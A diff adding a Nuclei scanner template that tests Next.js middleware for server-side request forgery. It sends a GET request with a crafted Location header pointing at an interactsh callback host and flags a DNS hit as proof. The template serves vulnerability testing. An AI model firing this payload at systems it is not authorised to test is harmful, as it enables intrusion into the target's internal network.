@@ -1,0 +1,24 @@
+id: nextjs-middleware-ssrf
+
+info:
+  name: Nextjs Middleware ssrf
+  author: omkar7505
+  severity: critical
+  description: Nextjs Middleware ssrf with Location header
+  reference:
+    - https://blog.rootsys.at/posts/nextjs-and-the-mutated-middleware/
+  tags: ssrf,oast,nextjs
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Location: https://{{interactsh-url}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
